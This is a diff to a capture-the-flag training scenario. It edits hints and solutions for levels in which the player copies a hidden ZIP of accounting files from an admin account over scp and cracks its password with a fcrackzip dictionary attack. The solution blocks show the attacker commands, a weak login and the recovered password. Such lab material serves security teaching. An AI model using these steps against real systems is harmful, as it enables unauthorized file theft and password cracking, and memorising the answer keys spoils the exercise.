@@ -212,7 +212,7 @@ The flag is the name of the only ZIP file (including the extension) located some
 
 **Hints** (*visible to the player if requested*):
 
-Hint 1 (Where to look for the files?): List directories and files in the admin's $HOME directory (`/home/admin`).
+Hint 1 (Where to look for the files?): List directories and files **including the hidden ones** in the admin's $HOME directory (`/home/admin`).
 
 Hint 2 (How to copy the ZIP files?): Use `scp` tool to copy the file.
 
@@ -222,13 +222,13 @@ scp <user>@<host>:<source path on remote machine> <destination on local machine>
 **Solution** (*visible to the player if requested*):
 
 ```
-root@attacker:/home# scp admin@10.1.26.9:~/personal/invoices2019.zip .
+root@attacker:/home# scp admin@10.1.26.9:~/personal/.invoices2019.zip .
 admin@10.1.26.9's password: admin
 ```
 
 **Flag value** (*visible to the player if (s)he solves the level*):
 
-invoices2019.zip
+.invoices2019.zip
 
 ---
 ---
@@ -265,7 +265,7 @@ Crack the zip's password using the fcrackzip tool.
 
 You have found out that some accounting company's files have been uploaded to this server. And you have a ZIP file with a promising name in your hands, but unfortunately, it is password-protected!
 
-The master advised you that a password cracking tool called `fcrackzip` was installed on his Kali machine. Find out how you could break the password and reveal the content of the ZIP.
+The master advised you that a password cracking tool called `fcrackzip` was installed on his Kali machine. Find out how you could break the password and reveal the content of the ZIP. Use `man fcrackzip` rather than `fcrackzip -h` for instructions on the tool usage.
 
 The flag is the password to the ZIP.
 
@@ -273,20 +273,20 @@ The flag is the password to the ZIP.
 
 Hint 1 (How to use the Fcrackzip tool?): You can perform a dictionary attack by using `-D` option of the `fcrackzip` command, but be aware that you have to use a wordlist. One is stored somewhere at your attacker machine.
 
-Hint 2 (Where is the wordlist stored?): Wordlists are stored by default in `/usr/share/wordlists`. There is currently only one file in that directory.
+Hint 2 (Where is the wordlist stored?): In `hacking` directory at you Kali, where you have already discover it.
 
 **Solution** (*visible to the player if requested*):
 
 ```
-root@attacker:~# fcrackzip -D -u -p /usr/share/wordlists/fasttrack.txt invoices2019.zip
+root@attacker:~# fcrackzip -D -u -p /root/hacking/wordlist.txt .invoices2019.zip
 
 PASSWORD FOUND!!!!: pw == IhateMyJob
 
-root@attacker:/home# unzip invoices2019.zip
+root@attacker:/home# unzip .invoices2019.zip
 
-Archive:  invoices2019.zip
-   creating: invoices2019/
-[invoices2019.zip] invoices2019/TAX15796252.txt password: IhateMyJob
+Archive:  .invoices2019.zip
+   creating: .invoices2019/
+[.invoices2019.zip] invoices2019/TAX15796252.txt password: IhateMyJob
 ```
 
 **Flag value** (*visible to the player if (s)he solves the level*):
